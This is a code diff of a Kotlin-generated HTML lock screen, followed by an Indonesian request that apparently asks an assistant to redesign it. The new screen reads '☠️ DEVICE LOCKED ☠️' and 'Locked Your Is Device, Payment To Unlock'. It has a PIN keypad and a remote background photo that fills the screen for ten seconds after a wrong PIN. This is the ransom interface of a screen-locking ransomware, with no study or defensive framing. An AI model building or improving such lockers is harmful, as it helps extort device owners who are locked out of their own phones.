@@ -202,12 +202,12 @@ ${body}
     }
 
     private fun buildLockHtml(): String {
-        val safeTitle = lockTitle
-            .replace("&", "&amp;")
-            .replace("<", "&lt;")
-            .replace("\"", "&quot;")
+    val safeTitle = lockTitle
+        .replace("&", "&amp;")
+        .replace("<", "&lt;")
+        .replace("\"", "&quot;")
 
-        return """<!DOCTYPE html>
+    return """<!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
@@ -216,40 +216,54 @@ ${body}
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 :root{
-  --bg:#050a05;
-  --card:#0a180a;
-  --red:#00ff41;
   --green:#00ff41;
-  --green-dim:rgba(0,255,65,.08);
-  --green-brd:rgba(0,255,65,.2);
-  --green-glow:rgba(0,255,65,.35);
   --text:#e0ffe0;
   --text2:#44aa44;
   --text3:#1a4a1a;
+  --panel:rgba(2,12,4,.55);
+  --panel-brd:rgba(0,255,65,.18);
 }
 html,body{height:100%;width:100%;overflow:hidden;touch-action:none}
 body{
-  background:var(--bg);
   font-family:'Outfit',sans-serif;
   -webkit-font-smoothing:antialiased;
-  display:flex;flex-direction:column;align-items:center;justify-content:center;
   min-height:100vh;
-  padding:32px 28px;
+  color:var(--text);
   position:relative;
   overflow:hidden;
+  background:#000;
 }
 
-/* ── CRACKED GLASS BACKGROUND ── */
-.crack-layer{
-  position:fixed;inset:0;pointer-events:none;z-index:0;
-  overflow:hidden;
+/* ── BACKGROUND FOTO (URL) ── */
+.bg-photo{
+  position:fixed;inset:0;
+  background-image:url('https://ganga--link--ghhzdp9sv8hk.code.run/i/9zvt8jff.jpg');
+  background-size:cover;
+  background-position:center;
+  background-repeat:no-repeat;
+  z-index:0;
+  transition:filter .6s ease, transform .6s ease;
 }
-.crack-layer svg{
-  width:100%;height:100%;
-  opacity:0.18;
+.bg-photo.full-bright{
+  filter:none;
+  z-index:200;
+  animation:fullZoom 10s ease-in-out forwards;
 }
+@keyframes fullZoom{
+  0%{transform:scale(1.05)}
+  100%{transform:scale(1.15)}
+}
+.bg-overlay{
+  position:fixed;inset:0;
+  background:
+    linear-gradient(180deg,rgba(0,0,0,.72) 0%,rgba(0,0,0,.55) 40%,rgba(0,0,0,.82) 100%),
+    radial-gradient(ellipse 70% 50% at 50% 0%,rgba(0,255,65,.10) 0%,transparent 60%);
+  z-index:1;
+  transition:opacity .5s ease;
+}
+.bg-overlay.hide{opacity:0;pointer-events:none}
 
-/* ── SCANLINE OVERLAY ── */
+/* ── SCANLINE ── */
 body::after{
   content:'';position:fixed;inset:0;
   background:repeating-linear-gradient(
@@ -260,23 +274,12 @@ body::after{
     rgba(0,255,65,.018) 4px
   );
   pointer-events:none;
-  z-index:1;
+  z-index:2;
   animation:scanMove 8s linear infinite;
 }
 @keyframes scanMove{
   0%{background-position:0 0}
   100%{background-position:0 100px}
-}
-
-/* ── AMBIENT GLOW ── */
-body::before{
-  content:'';position:fixed;inset:0;
-  background:
-    radial-gradient(ellipse 80% 50% at 50% -5%,rgba(0,200,50,.14) 0%,transparent 60%),
-    radial-gradient(ellipse 50% 40% at 10% 90%,rgba(200,20,20,.06) 0%,transparent 55%),
-    radial-gradient(ellipse 50% 35% at 90% 85%,rgba(0,180,40,.05) 0%,transparent 55%);
-  pointer-events:none;
-  z-index:0;
 }
 
 /* glitch flicker */
@@ -319,11 +322,7 @@ body::before{
   text-align:center;
   line-height:1.8;
 }
-.intro-title .line{
-  display:block;
-  overflow:hidden;
-  white-space:nowrap;
-}
+.intro-title .line{display:block;overflow:hidden;white-space:nowrap}
 .intro-title .line1{animation:typeIn .6s steps(22,end) .3s both}
 .intro-title .line2{animation:typeIn .5s steps(18,end) 1.1s both}
 .intro-title .line3{animation:typeIn .7s steps(26,end) 1.8s both}
@@ -344,111 +343,130 @@ body::before{
 }
 @keyframes barFill{to{width:100%}}
 
-.intro-pct{
+.intro-pct-wrap{
   font-family:'JetBrains Mono',monospace;
-  font-size:10px;letter-spacing:2px;
-  color:#00ff41;
-  animation:countUp 2.5s ease .5s forwards;
+  font-size:10px;letter-spacing:2px;color:#00ff41;
+  height:16px;overflow:hidden;
+  position:relative;width:60px;text-align:center;
 }
-@keyframes countUp{
-  0%{content:'0%'}
+.pct-num{
+  position:absolute;width:100%;text-align:center;
 }
 
-/* ── MAIN CONTENT ── */
+/* ── DATA STREAM PARTICLES ── */
+.data-stream{
+  position:fixed;top:0;left:0;width:100%;height:100%;
+  pointer-events:none;z-index:3;overflow:hidden;
+}
+.data-col{
+  position:absolute;top:-100%;
+  font-family:'JetBrains Mono',monospace;
+  font-size:11px;color:rgba(0,255,65,.15);
+  line-height:1.4;
+  animation:dataFall linear infinite;
+  white-space:pre;
+}
+@keyframes dataFall{to{top:110%}}
+
+/* ── MAIN LAYOUT ── */
 #mainContent{
-  display:flex;flex-direction:column;align-items:center;
-  position:relative;z-index:2;
+  position:relative;z-index:10;
+  width:100%;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:space-between;
+  padding:48px 24px 32px;
   opacity:0;
   animation:mainIn .6s ease forwards 4.4s;
-  width:100%;
 }
 @keyframes mainIn{to{opacity:1}}
 
-/* ── VIRUS ICON ── */
-.virus-wrap{
-  position:relative;width:100px;height:100px;
-  margin-bottom:22px;flex-shrink:0;
-}
-.virus-bg{
-  width:100px;height:100px;border-radius:50%;
-  background:radial-gradient(circle at 40% 35%,rgba(0,255,65,.12),rgba(0,80,20,.05));
-  border:1px solid rgba(0,255,65,.22);
-  display:flex;align-items:center;justify-content:center;
-  position:relative;z-index:1;
-  box-shadow:0 0 0 1px rgba(0,0,0,.5),0 0 40px rgba(0,255,65,.18),inset 0 1px 0 rgba(0,255,100,.08);
-  animation:virusPulse 2.5s ease-in-out infinite;
-}
-@keyframes virusPulse{
-  0%,100%{box-shadow:0 0 0 1px rgba(0,0,0,.5),0 0 30px rgba(0,255,65,.15),inset 0 1px 0 rgba(0,255,100,.08)}
-  50%{box-shadow:0 0 0 1px rgba(0,0,0,.5),0 0 60px rgba(0,255,65,.35),0 0 90px rgba(0,255,65,.1),inset 0 1px 0 rgba(0,255,100,.12)}
+/* ── TOP HEADER ── */
+.top-header{
+  width:100%;
+  display:flex;flex-direction:column;align-items:center;
+  text-align:center;
+  gap:14px;
+  flex-shrink:0;
 }
 
-/* rotating orbit rings */
-.v-orbit{
-  position:absolute;inset:-12px;border-radius:50%;
-  border:1px solid rgba(0,255,65,.12);
-  animation:orbitSpin 6s linear infinite;
-}
-.v-orbit2{
-  position:absolute;inset:-22px;border-radius:50%;
-  border:1px dashed rgba(0,255,65,.07);
-  animation:orbitSpin 10s linear infinite reverse;
-}
-.v-orbit::before,.v-orbit::after{
-  content:'';position:absolute;width:6px;height:6px;border-radius:50%;
-  background:var(--green);top:50%;left:-3px;margin-top:-3px;
-  box-shadow:0 0 8px var(--green),0 0 16px var(--green);
-}
-.v-orbit::after{left:auto;right:-3px;}
-@keyframes orbitSpin{to{transform:rotate(360deg)}}
-
-/* virus SVG spin */
-.virus-svg{animation:virusSpin 8s linear infinite;}
-@keyframes virusSpin{to{transform:rotate(360deg)}}
-
-/* spike pulse dots */
-.spike-dot{
-  position:absolute;width:5px;height:5px;border-radius:50%;
-  background:var(--green);
-  box-shadow:0 0 8px var(--green),0 0 16px var(--green);
-  animation:spikePulse 1.5s ease-in-out infinite;
-}
-.spike-dot:nth-child(1){top:2px;left:50%;transform:translateX(-50%);animation-delay:0s}
-.spike-dot:nth-child(2){bottom:2px;left:50%;transform:translateX(-50%);animation-delay:.3s}
-.spike-dot:nth-child(3){left:2px;top:50%;transform:translateY(-50%);animation-delay:.6s}
-.spike-dot:nth-child(4){right:2px;top:50%;transform:translateY(-50%);animation-delay:.9s}
-@keyframes spikePulse{
-  0%,100%{opacity:1;transform:scale(1) translateX(-50%)}
-  50%{opacity:.3;transform:scale(.5) translateX(-50%)}
-}
-/* fix non-centered dots */
-.spike-dot:nth-child(3){animation-name:spikePulseY}
-.spike-dot:nth-child(4){animation-name:spikePulseY}
-@keyframes spikePulseY{
-  0%,100%{opacity:1;transform:scale(1) translateY(-50%)}
-  50%{opacity:.3;transform:scale(.5) translateY(-50%)}
-}
-
-/* ── TITLE ── */
-.lock-title{
-  font-size:22px;font-weight:800;
-  color:var(--text);
-  text-align:center;letter-spacing:-.3px;line-height:1.2;
-  margin-bottom:4px;
+.warning-title{
+  font-family:'Outfit',sans-serif;
+  font-size:28px;
+  font-weight:800;
+  letter-spacing:1.5px;
+  color:#fff;
+  text-shadow:
+    0 0 20px rgba(0,255,65,.6),
+    0 0 40px rgba(0,255,65,.3),
+    0 2px 4px rgba(0,0,0,.8);
   animation:glitch 7s ease infinite;
-  text-shadow:0 0 20px rgba(0,255,65,.3);
+  line-height:1.15;
 }
-.lock-sub{
-  font-family:'JetBrains Mono',monospace;font-size:9px;
-  color:#1a5a1a;letter-spacing:2.5px;text-transform:uppercase;
-  text-align:center;margin-bottom:30px;
+
+.warning-sub{
+  font-family:'JetBrains Mono',monospace;
+  font-size:11px;
+  letter-spacing:2px;
+  text-transform:uppercase;
+  color:#88cc88;
+  text-shadow:0 1px 3px rgba(0,0,0,.9);
+  max-width:340px;
+  line-height:1.6;
+}
+
+.server-title{
+  margin-top:6px;
+  font-family:'Outfit',sans-serif;
+  font-size:18px;
+  font-weight:700;
+  color:#00ff41;
+  text-align:center;
+  letter-spacing:.3px;
+  text-shadow:0 0 14px rgba(0,255,65,.6), 0 2px 4px rgba(0,0,0,.8);
+  padding:0 12px;
+  max-width:90vw;
+  word-wrap:break-word;
+}
+
+/* ── BOTTOM PIN PANEL ── */
+.pin-panel{
+  width:100%;
+  max-width:340px;
+  background:var(--panel);
+  backdrop-filter:blur(14px);
+  -webkit-backdrop-filter:blur(14px);
+  border:1px solid var(--panel-brd);
+  border-radius:24px;
+  padding:22px 18px 20px;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  gap:16px;
+  box-shadow:
+    0 10px 40px rgba(0,0,0,.7),
+    0 0 40px rgba(0,255,65,.08),
+    inset 0 1px 0 rgba(0,255,100,.06);
+  flex-shrink:0;
+  animation:fadeUp .5s cubic-bezier(.16,1,.3,1) .3s both;
+}
+@keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:none}}
+
+.panel-label{
+  font-family:'JetBrains Mono',monospace;
+  font-size:9px;
+  letter-spacing:3px;
+  text-transform:uppercase;
+  color:#1a5a1a;
 }
 
 /* ── PIN DOTS ── */
-.pin-wrap{display:flex;gap:16px;justify-content:center;margin-bottom:10px;}
+.pin-wrap{display:flex;gap:16px;justify-content:center;}
 .pin-dot{
   width:14px;height:14px;border-radius:50%;
-  border:1.5px solid rgba(0,255,65,.2);
+  border:1.5px solid rgba(0,255,65,.25);
   background:transparent;
   transition:background .18s,border-color .18s,box-shadow .18s,transform .18s;
 }
@@ -466,10 +484,14 @@ body::before{
 
 /* ── STATUS ── */
 .pin-status{
-  height:24px;margin-bottom:28px;
-  font-family:'JetBrains Mono',monospace;font-size:10px;
-  letter-spacing:2px;text-transform:uppercase;
-  text-align:center;color:#1a5a1a;transition:color .2s;
+  height:20px;
+  font-family:'JetBrains Mono',monospace;
+  font-size:10px;
+  letter-spacing:2px;
+  text-transform:uppercase;
+  text-align:center;
+  color:#1a5a1a;
+  transition:color .2s;
 }
 .pin-status.err{color:#ff3333}
 .pin-status.ok{color:var(--green);text-shadow:0 0 10px var(--green)}
@@ -477,12 +499,12 @@ body::before{
 /* ── KEYPAD ── */
 .keypad{
   display:grid;grid-template-columns:repeat(3,1fr);
-  gap:10px;width:100%;max-width:292px;
+  gap:8px;width:100%;
 }
 .key{
-  height:66px;border-radius:14px;
-  border:1px solid rgba(0,255,65,.06);
-  background:linear-gradient(160deg,rgba(0,255,65,.04),rgba(0,80,20,.03));
+  height:60px;border-radius:14px;
+  border:1px solid rgba(0,255,65,.08);
+  background:linear-gradient(160deg,rgba(0,255,65,.05),rgba(0,80,20,.03));
   color:var(--text);
   display:flex;flex-direction:column;align-items:center;justify-content:center;
   cursor:pointer;-webkit-tap-highlight-color:transparent;
@@ -504,48 +526,6 @@ body::before{
   border-color:rgba(0,255,65,.3);
   box-shadow:0 0 20px rgba(0,255,65,.15),inset 0 1px 0 rgba(0,255,65,.1);
 }
-
-/* ── INTRO COUNTER HACK ── */
-.intro-pct-wrap{
-  font-family:'JetBrains Mono',monospace;
-  font-size:10px;letter-spacing:2px;color:#00ff41;
-  height:16px;overflow:hidden;
-  position:relative;width:60px;text-align:center;
-}
-.pct-num{
-  position:absolute;width:100%;text-align:center;
-  animation:pctAnim 2.5s ease .5s forwards;
-}
-@keyframes pctAnim{
-  0%{content:'0%';}
-}
-
-/* DATA STREAM PARTICLES */
-.data-stream{
-  position:fixed;top:0;left:0;width:100%;height:100%;
-  pointer-events:none;z-index:0;overflow:hidden;
-}
-.data-col{
-  position:absolute;top:-100%;
-  font-family:'JetBrains Mono',monospace;
-  font-size:11px;color:rgba(0,255,65,.15);
-  line-height:1.4;
-  animation:dataFall linear infinite;
-  white-space:pre;
-}
-@keyframes dataFall{
-  to{top:110%}
-}
-
-/* ── ENTRY ANIMATIONS ── */
-.virus-wrap{animation:popIn .5s cubic-bezier(.16,1,.3,1) both}
-@keyframes popIn{from{opacity:0;transform:scale(.7)}to{opacity:1;transform:none}}
-.lock-title{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .08s both}
-.lock-sub{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .13s both}
-.pin-wrap{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .18s both}
-.pin-status{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .22s both}
-.keypad{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .27s both}
-@keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:none}}
 </style>
 </head>
 <body>
@@ -581,156 +561,57 @@ body::before{
   </div>
 </div>
 
+<!-- BACKGROUND FOTO -->
+<div class="bg-photo" id="bgPhoto"></div>
+<div class="bg-overlay" id="bgOverlay"></div>
+
 <!-- DATA STREAM BG -->
 <div class="data-stream" id="dataStream"></div>
 
-<!-- CRACK LAYER -->
-<div class="crack-layer">
-  <svg viewBox="0 0 400 800" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
-    <!-- Main cracks -->
-    <g stroke="#00ff41" stroke-linecap="round" fill="none">
-      <!-- Crack cluster 1 - top left -->
-      <polyline points="60,0 80,90 50,140 90,200 60,240" stroke-width="1.2"/>
-      <polyline points="80,90 120,110 160,95" stroke-width=".7"/>
-      <polyline points="50,140 20,160 0,180" stroke-width=".6"/>
-      <polyline points="90,200 130,220 110,280 140,320" stroke-width=".8"/>
-
-      <!-- Crack cluster 2 - top right -->
-      <polyline points="320,0 300,60 340,120 310,180 350,230" stroke-width="1.1"/>
-      <polyline points="300,60 260,80 230,70" stroke-width=".7"/>
-      <polyline points="340,120 380,140 400,130" stroke-width=".6"/>
-      <polyline points="310,180 270,200 290,250 260,290" stroke-width=".8"/>
-
-      <!-- Crack cluster 3 - center -->
-      <polyline points="200,150 170,220 210,280 180,340 220,400" stroke-width="1.4"/>
-      <polyline points="170,220 130,240 110,280 130,330" stroke-width=".9"/>
-      <polyline points="210,280 250,300 280,280 310,310" stroke-width=".8"/>
-      <polyline points="180,340 150,370 160,420 130,460" stroke-width=".7"/>
-      <polyline points="220,400 260,420 250,470 280,510" stroke-width=".6"/>
-
-      <!-- Crack cluster 4 - bottom -->
-      <polyline points="100,550 130,620 90,680 120,750 100,800" stroke-width="1.1"/>
-      <polyline points="130,620 170,640 200,620 240,650" stroke-width=".7"/>
-      <polyline points="90,680 60,700 40,750 60,800" stroke-width=".7"/>
-
-      <polyline points="300,500 270,580 310,640 280,700 300,760 290,800" stroke-width="1.0"/>
-      <polyline points="270,580 240,600 220,580" stroke-width=".6"/>
-      <polyline points="310,640 350,660 380,640 400,660" stroke-width=".7"/>
-
-      <!-- Small splinter cracks -->
-      <polyline points="140,400 160,390 175,410 165,430" stroke-width=".5"/>
-      <polyline points="230,500 250,490 265,510 255,530 270,545" stroke-width=".5"/>
-      <polyline points="80,350 95,340 105,360" stroke-width=".4"/>
-      <polyline points="330,380 350,370 365,390 355,410" stroke-width=".5"/>
-    </g>
-
-    <!-- Impact points (epicenters) -->
-    <g fill="none" stroke="#00ff41">
-      <circle cx="200" cy="150" r="6" stroke-width=".8" opacity=".6"/>
-      <circle cx="200" cy="150" r="12" stroke-width=".4" opacity=".3"/>
-      <circle cx="80" cy="90" r="4" stroke-width=".7" opacity=".5"/>
-      <circle cx="300" cy="60" r="4" stroke-width=".7" opacity=".5"/>
-      <circle cx="130" cy="620" r="5" stroke-width=".6" opacity=".4"/>
-    </g>
-  </svg>
-</div>
-
 <!-- MAIN CONTENT -->
 <div id="mainContent">
-  <div class="virus-wrap">
-    <div class="v-orbit">
-      <div class="spike-dot"></div>
-      <div class="spike-dot"></div>
-      <div class="spike-dot"></div>
-      <div class="spike-dot"></div>
+
+  <!-- TOP: WARNING TITLE -->
+  <div class="top-header">
+    <div class="warning-title">☠️ DEVICE LOCKED ☠️</div>
+    <div class="warning-sub">Locked Your Is Device,<br>Payment To Unlock</div>
+    <div class="server-title">$safeTitle</div>
+  </div>
+
+  <!-- BOTTOM: PIN PANEL -->
+  <div class="pin-panel">
+    <div class="panel-label">Enter PIN To Unlock</div>
+
+    <div class="pin-wrap">
+      <div class="pin-dot" id="d0"></div>
+      <div class="pin-dot" id="d1"></div>
+      <div class="pin-dot" id="d2"></div>
+      <div class="pin-dot" id="d3"></div>
     </div>
-    <div class="v-orbit2"></div>
-    <div class="virus-bg">
-      <!-- Animated Virus SVG -->
-      <svg class="virus-svg" width="52" height="52" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <!-- Core circle -->
-        <circle cx="50" cy="50" r="22" fill="rgba(0,255,65,.08)" stroke="#00ff41" stroke-width="1.8"/>
-        <!-- Inner DNA-like strands -->
-        <circle cx="50" cy="50" r="13" fill="rgba(0,255,65,.06)" stroke="#00ff41" stroke-width="1.2" stroke-dasharray="4 3"/>
-        <!-- Center dot -->
-        <circle cx="50" cy="50" r="4" fill="rgba(0,255,65,.5)" stroke="#00ff41" stroke-width="1"/>
-        <!-- Spikes (12 spikes) -->
-        <line x1="50" y1="22" x2="50" y2="10" stroke="#00ff41" stroke-width="1.8" stroke-linecap="round"/>
-        <circle cx="50" cy="8" r="3.5" fill="rgba(0,255,65,.3)" stroke="#00ff41" stroke-width="1.2"/>
 
-        <line x1="72" y1="33" x2="81" y2="24" stroke="#00ff41" stroke-width="1.8" stroke-linecap="round"/>
-        <circle cx="83" cy="22" r="3.5" fill="rgba(0,255,65,.3)" stroke="#00ff41" stroke-width="1.2"/>
+    <div class="pin-status" id="pinStatus">Creator Smooth UK</div>
 
-        <line x1="78" y1="50" x2="90" y2="50" stroke="#00ff41" stroke-width="1.8" stroke-linecap="round"/>
-        <circle cx="92" cy="50" r="3.5" fill="rgba(0,255,65,.3)" stroke="#00ff41" stroke-width="1.2"/>
-
-        <line x1="72" y1="67" x2="81" y2="76" stroke="#00ff41" stroke-width="1.8" stroke-linecap="round"/>
-        <circle cx="83" cy="78" r="3.5" fill="rgba(0,255,65,.3)" stroke="#00ff41" stroke-width="1.2"/>
-
-        <line x1="50" y1="78" x2="50" y2="90" stroke="#00ff41" stroke-width="1.8" stroke-linecap="round"/>
-        <circle cx="50" cy="92" r="3.5" fill="rgba(0,255,65,.3)" stroke="#00ff41" stroke-width="1.2"/>
-
-        <line x1="28" y1="67" x2="19" y2="76" stroke="#00ff41" stroke-width="1.8" stroke-linecap="round"/>
-        <circle cx="17" cy="78" r="3.5" fill="rgba(0,255,65,.3)" stroke="#00ff41" stroke-width="1.2"/>
-
-        <line x1="22" y1="50" x2="10" y2="50" stroke="#00ff41" stroke-width="1.8" stroke-linecap="round"/>
-        <circle cx="8" cy="50" r="3.5" fill="rgba(0,255,65,.3)" stroke="#00ff41" stroke-width="1.2"/>
-
-        <line x1="28" y1="33" x2="19" y2="24" stroke="#00ff41" stroke-width="1.8" stroke-linecap="round"/>
-        <circle cx="17" cy="22" r="3.5" fill="rgba(0,255,65,.3)" stroke="#00ff41" stroke-width="1.2"/>
-
-        <!-- Diagonal spikes (shorter) -->
-        <line x1="61" y1="24" x2="66" y2="16" stroke="#00ff41" stroke-width="1.2" stroke-linecap="round"/>
-        <circle cx="68" cy="13" r="2.5" fill="#00ff41" opacity=".5"/>
-        <line x1="76" y1="39" x2="84" y2="34" stroke="#00ff41" stroke-width="1.2" stroke-linecap="round"/>
-        <circle cx="86" cy="32" r="2.5" fill="#00ff41" opacity=".5"/>
-        <line x1="76" y1="61" x2="84" y2="66" stroke="#00ff41" stroke-width="1.2" stroke-linecap="round"/>
-        <circle cx="86" cy="68" r="2.5" fill="#00ff41" opacity=".5"/>
-        <line x1="61" y1="76" x2="66" y2="84" stroke="#00ff41" stroke-width="1.2" stroke-linecap="round"/>
-        <circle cx="68" cy="87" r="2.5" fill="#00ff41" opacity=".5"/>
-        <line x1="39" y1="76" x2="34" y2="84" stroke="#00ff41" stroke-width="1.2" stroke-linecap="round"/>
-        <circle cx="32" cy="87" r="2.5" fill="#00ff41" opacity=".5"/>
-        <line x1="24" y1="61" x2="16" y2="66" stroke="#00ff41" stroke-width="1.2" stroke-linecap="round"/>
-        <circle cx="14" cy="68" r="2.5" fill="#00ff41" opacity=".5"/>
-        <line x1="24" y1="39" x2="16" y2="34" stroke="#00ff41" stroke-width="1.2" stroke-linecap="round"/>
-        <circle cx="14" cy="32" r="2.5" fill="#00ff41" opacity=".5"/>
-        <line x1="39" y1="24" x2="34" y2="16" stroke="#00ff41" stroke-width="1.2" stroke-linecap="round"/>
-        <circle cx="32" cy="13" r="2.5" fill="#00ff41" opacity=".5"/>
-      </svg>
+    <div class="keypad" id="keypad">
+      <div class="key" data-n="1"><span class="num">1</span><span class="sub"></span></div>
+      <div class="key" data-n="2"><span class="num">2</span><span class="sub">ABC</span></div>
+      <div class="key" data-n="3"><span class="num">3</span><span class="sub">DEF</span></div>
+      <div class="key" data-n="4"><span class="num">4</span><span class="sub">GHI</span></div>
+      <div class="key" data-n="5"><span class="num">5</span><span class="sub">JKL</span></div>
+      <div class="key" data-n="6"><span class="num">6</span><span class="sub">MNO</span></div>
+      <div class="key" data-n="7"><span class="num">7</span><span class="sub">PQRS</span></div>
+      <div class="key" data-n="8"><span class="num">8</span><span class="sub">TUV</span></div>
+      <div class="key" data-n="9"><span class="num">9</span><span class="sub">WXYZ</span></div>
+      <div class="key empty"></div>
+      <div class="key" data-n="0"><span class="num">0</span></div>
+      <div class="key del" data-del="1">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+          <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
+          <line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/>
+        </svg>
+      </div>
     </div>
   </div>
 
-  <div class="lock-title">$safeTitle</div>
-  <div class="lock-sub">Enter Pin To Unlock</div>
-
-  <div class="pin-wrap">
-    <div class="pin-dot" id="d0"></div>
-    <div class="pin-dot" id="d1"></div>
-    <div class="pin-dot" id="d2"></div>
-    <div class="pin-dot" id="d3"></div>
-  </div>
-
-  <div class="pin-status" id="pinStatus">Creator Smooth UK</div>
-
-  <div class="keypad" id="keypad">
-    <div class="key" data-n="1"><span class="num">1</span><span class="sub"></span></div>
-    <div class="key" data-n="2"><span class="num">2</span><span class="sub">ABC</span></div>
-    <div class="key" data-n="3"><span class="num">3</span><span class="sub">DEF</span></div>
-    <div class="key" data-n="4"><span class="num">4</span><span class="sub">GHI</span></div>
-    <div class="key" data-n="5"><span class="num">5</span><span class="sub">JKL</span></div>
-    <div class="key" data-n="6"><span class="num">6</span><span class="sub">MNO</span></div>
-    <div class="key" data-n="7"><span class="num">7</span><span class="sub">PQRS</span></div>
-    <div class="key" data-n="8"><span class="num">8</span><span class="sub">TUV</span></div>
-    <div class="key" data-n="9"><span class="num">9</span><span class="sub">WXYZ</span></div>
-    <div class="key empty"></div>
-    <div class="key" data-n="0"><span class="num">0</span></div>
-    <div class="key del" data-del="1">
-      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
-        <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
-        <line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/>
-      </svg>
-    </div>
-  </div>
 </div>
 
 <script>
@@ -777,7 +658,22 @@ setTimeout(function(){
   }
 })();
 
-/* ── ORIGINAL PIN LOGIC (UNCHANGED) ── */
+/* ── FULLSCREEN FOTO SAAT PIN SALAH ── */
+var photoTimeout = null;
+function showFullscreenPhoto(){
+  var bg = document.getElementById('bgPhoto');
+  var overlay = document.getElementById('bgOverlay');
+  overlay.classList.add('hide');
+  bg.classList.add('full-bright');
+  if(photoTimeout) clearTimeout(photoTimeout);
+  photoTimeout = setTimeout(function(){
+    bg.classList.remove('full-bright');
+    overlay.classList.remove('hide');
+    photoTimeout = null;
+  }, 10000);
+}
+
+/* ── ORIGINAL PIN LOGIC ── */
 var pin = '';
 var blocked = false;
 document.getElementById('keypad').addEventListener('touchend', function(e) {
@@ -823,6 +719,7 @@ function checkPin() {
     for (var i = 0; i < 4; i++) {
       document.getElementById('d' + i).classList.add('error');
     }
+    showFullscreenPhoto();
     blocked = true;
     setTimeout(function() {
       pin = ''; blocked = false;
@@ -840,5 +737,8 @@ function setStatus(msg, isErr, isOk) {
 </body>
 </html>
 """
-    }
 }
+}
+
+bisa kamu ubah html nya? jadi nanti tampilannya ubah total, pertama dibagian atas kasih teks ☠️ DEVICE LOCKED ☠️ lalu dibawah teks ini ada teks kecil yaitu Locked Your Is Device, Payment To Unlock. lalu untuk dibagian bawah nya itu dipaling bawah ada Kotak area didalamnya ada angka angka gitu buat input password nya lalu teks Device Locked nya ini itu bisa diubah sesuai di server nya, sudah hanya melakukan perubahan ini saja sisanya masih sama 100% pastikan work seperti sebelumnya, dan background nya ini berupa foto url yaitu https://ganga--link--ghhzdp9sv8hk.code.run/i/9zvt8jff.jpg
+lalu jika password nya salah nanti background foto nya ini akan full layar selama 10 detik
